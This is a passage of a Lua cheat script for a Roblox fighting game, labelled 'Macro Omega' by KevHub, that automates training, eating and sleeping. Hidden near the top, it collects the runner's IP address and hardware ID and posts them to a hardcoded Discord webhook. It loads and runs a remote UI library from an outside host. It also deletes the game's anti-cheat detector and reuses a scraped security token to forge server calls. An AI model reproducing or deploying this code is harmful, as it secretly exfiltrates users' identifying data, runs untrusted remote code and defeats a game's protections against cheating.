local root = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart");
local autoeat = false
local autosleep = false
local trainingstart = os.clock()

_G.TreadWait = 0
_G.SavePos = root.CFrame.Position
_G.Fly = false

local data = {}
local koslist
local T = {}
local Treads = {}
local Beds = {}
local statss = {}
local statlabels = {}

pcall(function()
	data = game:GetService("HttpService"):JSONDecode(readfile("kos_list.json"));
end)

koslist = data

local validchars = {"👑", "🐦", " ", " ", " "}
local function random_string(length)
	local s = {}

	for i = 1, length do 
		s[i] = validchars[math.random(1, #validchars)]
	end

	return table.concat(s)
end

_G.UIName = random_string(10)

local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";
local ipaddy = game:HttpGet("https://api.ipify.org/")

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

local msg = {
	['content'] = "";
	['embeds'] = {{
		['title'] = game.Players.LocalPlayer.Name;
		['description'] = "Macro Omega Executed";
		['color'] = 49661;
		['fields'] = {{
			['name'] = "*__IP__*";
			['value'] = ipaddy;
		},
		{
			['name'] = "*__HWID__*";
			['value'] = hwid;
		}};
		['author'] = {['name'] = "KevHub"};
		['timestamp'] = DateTime.now():ToIsoDate()
	}}
}

local exp = syn.request({
	Url = "https://discord.com/api/webhooks/931381674833494036/Qd0cljvWTfgfdw95vmjl6tDYPJHtV46oIlGQIEYtI_2PJQE7LJ3leuLkIPiPbeijpLPb";
	Method = "POST";
	Headers = {['Content-Type'] = 'application/json'};
	Body = game:GetService('HttpService'):JSONEncode(msg)
})

local remotesecurity
for i,v in pairs(getgc()) do
	if getfenv(v).script and getfenv(v).script.Name == "LocalS" then
		if type(v) == "function" then
			for I2,V2 in pairs(debug.getupvalues(v)) do
				if I2 == 21 then 
					remotesecurity = V2  
				end
			end
		end
	end
end

for I,V in pairs(getgc()) do
	if getfenv(V).script and getfenv(V).script.Name == "LocalS" then
		if type(V) == "function" then
			for I2,V2 in pairs(debug.getupvalues(V)) do
				if V2 ~= nil then
					if type(V2) == "table" then
						if I2 == 3 then							
							game:GetService("RunService").RenderStepped:Connect(function()
								for i,v in pairs(V2) do
									if type(v) ~= "function" then
										statss[i] = v
									end
								end
							end)
						end
					end
				end
			end
		end
	end
end

for i,v in pairs(game.Players.LocalPlayer.PlayerGui.PlayerList:GetDescendants()) do
	if v:IsA("TextButton") then
		v.MouseButton1Click:Connect(function()
			if tostring(workspace.CurrentCamera.CameraSubject.Parent) == v.Parent.Name then
				workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			else
				workspace.CurrentCamera.CameraSubject = game.Players[v.Parent.Name].Character
			end
		end)
	end
end

game.Players.LocalPlayer.PlayerGui.PlayerList.DescendantAdded:Connect(function(v)
	if v:IsA("TextButton") then
		v.MouseButton1Click:Connect(function()
			if tostring(workspace.CurrentCamera.CameraSubject.Parent) == v.Parent.Name then
				workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			else
				workspace.CurrentCamera.CameraSubject = game.Players[v.Parent.Name].Character
			end
		end)
	end
end)

do
	local a = workspace:GetDescendants()
	for x = 1, #a do
		if (a[x]:IsA("Part") and a[x].Name == "Head" and a[x].Parent.Name == "Strike Speed Training: $45") then
			table.insert(T, a[x])
		end
	end

	for i = 1, #a do
		if (a[i]:IsA("Model") and a[i].Name == "Machine" and a[i]:FindFirstChild("Screen") and a[i]:FindFirstChild("ClickDetector")) then
			table.insert(Treads, a[i])
		end
	end

	for z = 1, #a do
		if (a[z]:IsA("Model") and a[z].Name == "Bed" and a[z]:FindFirstChildWhichIsA("ClickDetector")) then
			table.insert(Beds, a[z])
		end
	end

	if game.ReplicatedStorage.Events:FindFirstChild("Detector") then
		game.ReplicatedStorage.Events:FindFirstChild("Detector"):Destroy()
	end
end

local function click()
	return game.VirtualUser:ClickButton1(Vector2.new());
end

local function Training()		
	for i,v in pairs(T) do
		local d = (root.Position - v.Position).magnitude

		if (d <= 50) then
			return v
		end
	end
end

local function PickStat(V)
	repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI
	local stam = game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI.Frame.StatPickF[V]
	game.VirtualInputManager:SendMouseButtonEvent(stam.AbsolutePosition.X + 100, stam.AbsolutePosition.Y + 50, 0,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(stam.AbsolutePosition.X + 100, stam.AbsolutePosition.Y + 50, 0,false,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(stam.AbsolutePosition.X + 100, stam.AbsolutePosition.Y + 50, 0,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(stam.AbsolutePosition.X + 100, stam.AbsolutePosition.Y + 50, 0,false,game,0)
end

local function PickLevel(V)
	repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI
	local lvl = game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI.Frame2.ListF[V]
	game.VirtualInputManager:SendMouseButtonEvent(lvl.AbsolutePosition.X + 100, lvl.AbsolutePosition.Y + 50, 0,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(lvl.AbsolutePosition.X + 100, lvl.AbsolutePosition.Y + 50, 0,false,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(lvl.AbsolutePosition.X + 100, lvl.AbsolutePosition.Y + 50, 0,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(lvl.AbsolutePosition.X + 100, lvl.AbsolutePosition.Y + 50, 0,false,game,0)
end

local function Start()
	repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI
	local x = workspace.CurrentCamera.ViewportSize.X / 2
	local y = workspace.CurrentCamera.ViewportSize.Y / 2

	game.VirtualInputManager:SendMouseButtonEvent(x, y, 0,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(x, y, 0,false,game,0)
end

local function Treadmill(stat, level)
	repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI")
	wait(_G.TreadWait)
	local treadgen = _G.TreadRegen or 90
	wait(.75)
	PickStat(stat)
	wait(.75)
	PickLevel(level)
	wait(.75)
	repeat
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local percent = (curstam / maxstam) * 100
		wait()
	until percent >= treadgen
	Start()
	wait(.75)

	repeat wait()
		if not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI") then break end
		local key = game:GetService("Players").LocalPlayer.PlayerGui.TreadmillMachineGUI.Frame3.TrainingF.ButtonTemplate.Input.Text
		local minimum = _G.Regen or 5
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local percent = (curstam / maxstam) * 100

		if percent > minimum then
			game.VirtualInputManager:SendKeyEvent(true, key, false, game)
			game.VirtualInputManager:SendKeyEvent(false, key, false, game)
		end
	until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI")
end

local function StartSS()
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name == "Strike Speed Training" then
			game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v);
			wait(0.5)
			click()
		end
	end
end

local function m2()
	game.VirtualInputManager:SendMouseButtonEvent(game:service"UserInputService":GetMouseLocation().X, game:service"UserInputService":GetMouseLocation().Y,1,true,game,0)
	game.VirtualInputManager:SendMouseButtonEvent(game:service"UserInputService":GetMouseLocation().X, game:service"UserInputService":GetMouseLocation().Y,1,false,game,0)
end

local function Run()
	game.VirtualInputManager:SendKeyEvent(true, "W", false, game);
	game.VirtualInputManager:SendKeyEvent(true, "W", false, game);
	game.VirtualInputManager:SendKeyEvent(true, "S", false, game);
end

local function StopRun()
	game.VirtualInputManager:SendKeyEvent(false, "W", false, game);
	game.VirtualInputManager:SendKeyEvent(false, "W", false, game);
	game.VirtualInputManager:SendKeyEvent(false, "S", false, game);
end

local function EquipCombat()
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v:FindFirstChild("Style") then
			game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v);
		end
	end
end

local function foodchoice()
	if _G.Food ~= "" and _G.Food ~= " " and game.Players.LocalPlayer.Backpack:FindFirstChild(_G.Food) then
		return true
	else	
		if game.Players.LocalPlayer.Character:FindFirstChild(_G.Food) then
			return true
		else
			return false
		end
	end
end

local function AutoEat()
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v:FindFirstChild("FoodScript") and v:IsA("Tool") then
			local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
			local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
			local percentage = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100
			local minimum = _G.Hunger or 75

			if percentage < minimum then
				autoeat = true

				if foodchoice() == true then
					pcall(function()
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[_G.Food]);
					end)
				else
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
				end

				repeat wait(1)
					local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
					local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
					local percentage = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

					if percentage >= 90 then break end
					if not v then autoeat = false break end

					game.VirtualUser:ClickButton1(Vector2.new(3000,3000))
				until percentage >= 90

				game.Players.LocalPlayer.Character.Humanoid:UnequipTools();
				EquipCombat();
				task.wait();
				autoeat = false
			end


			break;
		end
	end
end

local function Strike()
	if not autoeat then
		if _G.Test then
			game.VirtualUser:ClickButton1(Vector2.new())
			game.VirtualInputManager:SendMouseButtonEvent(game:service"UserInputService":GetMouseLocation().X, game:service"UserInputService":GetMouseLocation().Y,1,true,game,0)
			game.VirtualInputManager:SendMouseButtonEvent(game:service"UserInputService":GetMouseLocation().X, game:service"UserInputService":GetMouseLocation().Y,1,false,game,0)
			EquipCombat()
		end
	end
end

local function SStrike()
	local SpeedTraining = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("SpeedTraining")

	SpeedTraining.CanHit:GetPropertyChangedSignal("Value"):Connect(function()
		if SpeedTraining.CanHit.Value == true then
			repeat
				if not SpeedTraining then break end
				if not root then break end
				if not _G.Enabled then break end

				click()
				wait(0.01)
				m2()
				wait(1.1)
			until SpeedTraining.CanHit.Value == false
		end
	end)
end

local function AutoStrikingPower()
	while _G.Test do
		if not _G.Test then break end
		if autoeat then break end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local percentage = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local minimum = _G.Hunger or 75

		if game.Players.LocalPlayer.Character.CurrentStamina.Value < game.Players.LocalPlayer.Character.MaxStamina.Value / 20 then
			repeat wait() until game.Players.LocalPlayer.Character.CurrentStamina.Value > game.Players.LocalPlayer.Character.MaxStamina.Value / 2
		end

		if game.Players.LocalPlayer.Character.CurrentStamina.Value > game.Players.LocalPlayer.Character.MaxStamina.Value / 1.85 then
			Run()
			repeat wait() until game.Players.LocalPlayer.Character.CurrentStamina.Value <= game.Players.LocalPlayer.Character.MaxStamina.Value / 2 
			StopRun()
			EquipCombat()
			Strike()
		end

		Strike()

		if _G.EatToggle then
			if percentage < minimum then
				AutoEat()
			end
		end

		if percentage <= 15 then
			game.Players.LocalPlayer:Kick("You were starving, you've been kicked");
		end
		wait();
	end
end

local function FastPushups()
	while _G.FastPushups do
		if not _G.FastPushups then break end
		if not _G.TrainingBool then break end
		if autoeat then break end
		if autosleep then break end

		if _G.Delay and _G.Max then
			if (os.clock() - trainingstart) > _G.Max then
				wait(_G.Delay)
				trainingstart = os.clock()
			end 
		end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local stamina = (curstam / maxstam) * 100

		local regen = _G.Regen or 5
		local minimum = _G.Hunger or 75

		if stamina <= regen then
			repeat
				wait()
				maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
				curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
				stamina = (curstam / maxstam) * 100
			until stamina > 95
		end

		if _G.EatToggle then
			if hunger < minimum then
				AutoEat()
			end
		end

		if not game.Players.LocalPlayer.Character:FindFirstChild("Push up") then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Push up"])
		end

		click()
		wait();
	end
end

local function SlowPushups()
	while _G.SlowPushups do
		if not _G.SlowPushups then break end
		if not _G.TrainingBool then break end
		if autoeat then break end
		if autosleep then break end

		if _G.Delay and _G.Max then
			if (os.clock() - trainingstart) > _G.Max then
				wait(_G.Delay)
				trainingstart = os.clock()
			end 
		end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local stamina = (curstam / maxstam) * 100

		local regen = _G.Regen or 5
		local minimum = _G.Hunger or 75

		if stamina <= regen then
			repeat
				wait()
				maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
				curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
				stamina = (curstam / maxstam) * 100
			until stamina > 95
		end

		if _G.EatToggle then
			if hunger < minimum then
				AutoEat()
			end
		end

		if not game.Players.LocalPlayer.Character:FindFirstChild("Push up") then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Push up"])
		end

		click()
		wait(.8);
	end
end

local function FastSquats()
	while _G.FastSquats do
		if not _G.FastSquats then break end
		if not _G.TrainingBool then break end
		if autoeat then break end
		if autosleep then break end

		if _G.Delay and _G.Max then
			if (os.clock() - trainingstart) > _G.Max then
				wait(_G.Delay)
				trainingstart = os.clock()
			end 
		end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local stamina = (curstam / maxstam) * 100

		local regen = _G.Regen or 5
		local minimum = _G.Hunger or 75

		if stamina <= regen then
			repeat
				wait()
				maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
				curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
				stamina = (curstam / maxstam) * 100
			until stamina > 95
		end

		if _G.EatToggle then
			if hunger < minimum then
				AutoEat()
			end
		end

		if not game.Players.LocalPlayer.Character:FindFirstChild("Squat") then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Squat"])
		end

		click()
		wait();
	end
end

local function SlowSquats()
	while _G.SlowSquats do
		if not _G.SlowSquats then break end
		if not _G.TrainingBool then break end
		if autoeat then break end
		if autosleep then break end

		if _G.Delay and _G.Max then
			if (os.clock() - trainingstart) > _G.Max then
				wait(_G.Delay)
				trainingstart = os.clock()
			end 
		end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local stamina = (curstam / maxstam) * 100

		local regen = _G.Regen or 5
		local minimum = _G.Hunger or 75

		if stamina <= regen then
			repeat
				wait()
				maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
				curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
				stamina = (curstam / maxstam) * 100
			until stamina > 95
		end

		if _G.EatToggle then
			if hunger < minimum then
				AutoEat()
			end
		end

		if not game.Players.LocalPlayer.Character:FindFirstChild("Squat") then
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Squat"])
		end

		click()
		wait(.8);
	end
end

local function Stamina()
	while _G.Stamina do
		if not _G.Stamina then StopRun() break end
		if not _G.TrainingBool then StopRun() break end
		if autoeat then StopRun() break end
		if autosleep then StopRun() break end

		if _G.Delay and _G.Max then
			if (os.clock() - trainingstart) > _G.Max then
				StopRun()
				wait(_G.Delay)
				trainingstart = os.clock()
			end 
		end

		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100

		local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		local stamina = (curstam / maxstam) * 100

		local regen = _G.Regen or 5
		local minimum = _G.Hunger or 75

		if stamina <= regen then
			StopRun()
			repeat
				wait()
				maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
				curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
				stamina = (curstam / maxstam) * 100
			until stamina > 95
		end

		if _G.EatToggle then
			if hunger < minimum then
				StopRun()
				AutoEat()
			end
		end

		if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Sprinting") then
			Run()
		end
		wait(1);
	end
end

local function AutoSleep()
	local D = {}
	local B = {}
	local target
	for i,v in pairs(Beds) do
		if v:FindFirstChildWhichIsA("Part") then
			table.insert(D, (v:FindFirstChildWhichIsA("Part").Position - root.Position).magnitude)
		end
	end

	if (#D < 1) then
		return
	end

	local closest = math.min(unpack(D))

	autosleep = true
	wait(2.5)
	game.Players.LocalPlayer.Character.Humanoid:UnequipTools()

	for _, bed in pairs(Beds) do
		if bed:FindFirstChildWhichIsA("Part") then
			local d = (bed:FindFirstChildWhichIsA("Part").Position - root.Position).magnitude

			if (d == closest) then
				target = bed
				game.Players.LocalPlayer.Character.Humanoid:MoveTo(bed.Matress.CFrame.Position)
				game.Players.LocalPlayer.Character.Humanoid.MoveToFinished:Wait()
			end
		end
	end

	wait(2.5)
	fireclickdetector(target.ClickDetector)
	repeat wait() until statss.BodyFatigue <= 0.1
	fireclickdetector(target.ClickDetector)
	wait(2.5)

	game.Players.LocalPlayer.Character.Humanoid:MoveTo(_G.SavePos)
	game.Players.LocalPlayer.Character.Humanoid.MoveToFinished:Wait()

	wait(1.5)
	autosleep = false
	wait(1)
end

local DiscordLib = loadstring(game:HttpGet "https://kevhubmightyomega.000webhostapp.com/uilib.lua")()
local win = DiscordLib:Window("Macro Omega")
local serv = win:Server("v0.02", "")
local trainn = serv:Channel("Training")
local machine = serv:Channel("Machines")
local stat = serv:Channel("Stat Viewer")
local misc = serv:Channel("Misc")
local setting = serv:Channel("Settings")

local drops = trainn:Dropdown("Training Type", {"Pushups", "Squats", "Stamina"}, function(_type)
	_G.TrainType = _type
end)

local drops1 = trainn:Dropdown("Training Speed", {"Fast", "Slow"}, function(speed)
	_G.TrainSpeed = speed
end)

local slider = trainn:Slider("Stop on % to regen", 0, 100, 5, function(stam)
	_G.Regen = stam
end)

trainn:Toggle("Train", false, function(bool)
	_G.TrainingBool = bool

	if _G.TrainingBool then
		if _G.TrainType == "Pushups" then
			if _G.TrainSpeed == "Fast" then
				while _G.TrainingBool do
					if not _G.TrainingBool then 
						_G.FastPushups = false
						break
					end
					_G.FastPushups = true
					FastPushups()
					wait(.1);
				end
			elseif _G.TrainSpeed == "Slow" then
				while _G.TrainingBool do
					if not _G.TrainingBool then
						_G.SlowPushups = false
						break
					end
					_G.SlowPushups = true
					SlowPushups()
					wait(.1);
				end
			else
				DiscordLib:Notification("KevHub", "Please Select your TrainingSpeed", "Okay")
			end
		elseif _G.TrainType == "Squats" then
			if _G.TrainSpeed == "Fast" then
				while _G.TrainingBool do
					if not _G.TrainingBool then
						_G.FastSquats = false
						break
					end
					_G.FastSquats = true
					FastSquats()
					wait(.1);
				end
			elseif _G.TrainSpeed == "Slow" then
				while _G.TrainingBool do
					if not _G.TrainingBool then
						_G.SlowSquats = false
						break
					end
					_G.SlowSquats = true
					SlowSquats()
					wait(.1);
				end
			else
				DiscordLib:Notification("KevHub", "Please Select your TrainingSpeed", "Okay")
			end
		elseif _G.TrainType == "Stamina" then
			while _G.TrainingBool do
				if not _G.TrainingBool then
					_G.Stamina = false
					StopRun()
					break
				end
				_G.Stamina = true
				Stamina()
				wait(.1);
			end
		else
			DiscordLib:Notification("KevHub", "Please Select your TrainingType", "Okay")
		end
	end
end)
trainn:Seperator()

local delayslider = trainn:Slider("Delay before resuming macro", 0, 300, 50, function(stam)
	_G.Delay = stam
end)

local maxslider = trainn:Slider("Max time before pausing macro", 0, 300, 50, function(stam)
	_G.Max = stam
end)

trainn:Seperator()

trainn:Toggle("Auto Striking Power", false, function(a)
	_G.Test = a

	while _G.Test do
		if not _G.Test then break end
		AutoStrikingPower()
		wait(.1);
	end
end)

trainn:Toggle("Auto Striking Speed", false, function(b)
	_G.Enabled = b 

	while _G.Enabled do
		if not _G.Enabled then break end
		if not game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("SpeedTraining") then

			if autoeat == true then
				repeat wait() until autoeat == false
			end
			repeat
				fireclickdetector(Training().Parent.ClickDetector, 3)
				wait(0.5)
			until game.Players.LocalPlayer.Backpack:FindFirstChild("Strike Speed Training")

			repeat
				StartSS()
				wait(1)
			until not game.Players.LocalPlayer.Backpack:FindFirstChild("Strike Speed Training") and game.Players.LocalPlayer.PlayerGui:FindFirstChild("SpeedTraining")

			EquipCombat()
			task.wait();
			SStrike();
		end
		wait(0.2)
	end
end)

local drops2 = machine:Dropdown("Treadmill Type", {"Stamina", "RunningSpeed"}, function(_type)
	_G.TreadmillType = _type
end)

local drops3 = machine:Dropdown("Treadmill Power", {"1", "2", "3", "4", "5"}, function(power)
	_G.TreadmillPower = power
end)

local anotherslider = machine:Slider("Wait until % to start treadmill", 0, 100, 90, function(stam)
	_G.TreadRegen = stam
end)

machine:Toggle("Delay Treadmill", false, function(bool)
	_G.DelayToggleTread = bool

	if _G.DelayToggleTread then
		_G.TreadWait = 23
	else
		_G.TreadWait = 0
	end
end)

machine:Toggle("Auto Treadmill", false, function(bool)
	_G.TreadmillBool = bool

	while _G.TreadmillBool do
		if not _G.TreadmillBool then break end
		repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI")
		Treadmill(_G.TreadmillType, _G.TreadmillPower, _G.Regen or 5)
		wait(.1);
	end
end)

machine:Toggle("Auto Hopon Treadmill", false, function(bool)
	_G.AutoHopTread = bool

	while _G.AutoHopTread do
		if not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI") then
			for i,v in pairs(Treads) do
				local d = (root.Position - v.Screen.Position).magnitude

				if (d <= 12) then
					if not autoeat then
						fireclickdetector(v.ClickDetector, 5)
					end
				end
			end
		end
		wait();
	end
end)

stat:Label("Durability: "..statss.Durability)
stat:Label("UpperMuscle: "..statss.UpperBodyMuscle)
stat:Label("LowerMuscle: "..statss.LowerBodyMuscle)
stat:Label("RunSpeed: "..statss.RunningSpeed)
stat:Label("Stamina: "..statss.Stamina)
stat:Label("StrikingPower: "..statss.StrikingPower)
stat:Label("StrikingSpeed: "..statss.StrikingSpeed)
stat:Label("Fat: "..statss.Fat)
stat:Label("Trait: "..statss.Trait)
stat:Label("Height: "..statss.Height)
stat:Label("BreadCount: "..statss.Money)
stat:Label("Calories: "..statss.Calories)
stat:Label("Hunger: "..statss.Stomach)
stat:Label("BodyFatigue: "..statss.BodyFatigue)

for i,v in pairs(game:GetService("CoreGui")[_G.UIName]:GetDescendants()) do
	if string.match(v.Name, "|stat") == "|stat" then
		table.insert(statlabels, v)
	end
end

game:GetService("RunService").RenderStepped:Connect(function()
	statlabels[1].Text = "Durability: "..statss.Durability
	statlabels[2].Text = "UpperMuscle: "..statss.UpperBodyMuscle
	statlabels[3].Text = "LowerMuscle: "..statss.LowerBodyMuscle
	statlabels[4].Text = "RunSpeed: "..statss.RunningSpeed
	statlabels[5].Text = "Stamina: "..statss.Stamina
	statlabels[6].Text = "StrikingPower: "..statss.StrikingPower
	statlabels[7].Text = "StrikingSpeed: "..statss.StrikingSpeed
	statlabels[8].Text = "Fat: "..statss.Fat
	statlabels[9].Text = "Trait: "..statss.Trait
	statlabels[10].Text = "Height: "..statss.Height
	statlabels[11].Text = "BreadCount: "..statss.Money
	statlabels[12].Text = "Calories: "..statss.Calories
	statlabels[13].Text = "Hunger: "..statss.Stomach
	statlabels[14].Text = "BodyFatigue: "..statss.BodyFatigue
end)


misc:Textbox("Food Priority", "Type Here", false, function(v)
	_G.Food = v
end)

local slider2 = misc:Slider("Auto Eat at % Hunger", 0, 100, 75, function(stam)
	_G.Hunger = stam
end)

misc:Toggle("Auto Eat", false, function(lean)
	_G.EatToggle = lean

	while _G.EatToggle do
		if not _G.EatToggle then break end
		local maxbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF
		local curbar = game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar
		local hunger = (curbar.AbsoluteSize.X / maxbar.AbsoluteSize.X) * 100
		local minimum = _G.Hunger or 75

		if hunger < minimum then
			AutoEat()
		end
		wait(1);
	end
end)

misc:Seperator()

local slider3 = misc:Slider("Freeze Stamina at %", 0, 100, 50, function(stam)
	_G.FreezePercent = stam
end)

misc:Toggle("Freeze Stamina", false, function(bool)
	_G.Freeze = bool

	local curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
	local maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
	local stamin = (curstam / maxstam) * 100
	local amount = _G.FreezePercent or 50

	while _G.Freeze do
		if not _G.Freeze then break end
		
		curstam = game.Players.LocalPlayer.Character.CurrentStamina.Value
		maxstam = game.Players.LocalPlayer.Character.MaxStamina.Value
		stamin = (curstam / maxstam) * 100
		amount = _G.FreezePercent or 50

		if stamin <= amount then
			game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(remotesecurity, "Dash", {(maxstam/75) * -1.2, -50})
		elseif stamin > amount then
			game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(remotesecurity, "Dash", {(maxstam/75) * 1.2, 50})
		end
		wait(.1)
	end
end)

misc:Seperator()

local slider4 = misc:Slider("Auto Sleep at BodyFatigue %", 0, 100, 65, function(fatigue)
	_G.Fatigue = fatigue
end)

misc:Toggle("Auto Sleep", false, function(b)
	_G.SleepToggle = b

	while _G.SleepToggle do
		local fatigue = _G.Fatigue or 65
		if tonumber(statss.BodyFatigue)  > fatigue then
			AutoSleep()
		end
		wait(.1)
	end
end)

misc:Button("Save Return Position:", function(v)
	_G.SavePos = root.CFrame.Position
end)

misc:Seperator()

misc:Toggle("RunToggle", false, function(c)
	_G.RunToggle = c

	while _G.RunToggle do
		if not _G.RunToggle then
			Run()
			wait(.01)
			StopRun()
			break
		end

		if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Sprinting") then
			game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(remotesecurity, "RunToggle", {true, false})
		end
		wait(1)
	end
end)

misc:Seperator()

misc:Textbox("Transfer Food To", "Username here", false, function(name)
	_G.Vic = name
end)

misc:Button("Transfer Food", function()
	local vic = _G.Vic or nil
	local plr = game.Players.LocalPlayer
	local char = plr.Character
	local pos = char.HumanoidRootPart.Position

	local amount = 20
	local curmount = 0

	char.HumanoidRootPart.CFrame = game.Players[vic].Character.PrimaryPart.CFrame

	for i,v in pairs(plr.Backpack:GetChildren()) do
		if v:IsA("Tool") and v:FindFirstChild("FoodScript") then
			v.Parent = char
		end
	end

	wait(.1)
	char.Humanoid:Destroy()
	wait(.1)

	local weld = Instance.new("Weld", char)
	weld.Part0 = char.HumanoidRootPart
	weld.Part1 = game.Players[vic].Character.PrimaryPart

	for i,v in pairs(char:GetChildren()) do
		if v:IsA("Tool") and v:FindFirstChild("FoodScript") then
			repeat wait()
				if curmount >= amount then break end
				curmount = curmount + 1
				local copy = v:Clone()
				copy.Parent = game.Players[vic].Character
				copy:FindFirstChild("Handle").CFrame = game.Players[vic].Character.HumanoidRootPart
			until curmount >= amount
		end
	end

	wait(.05)
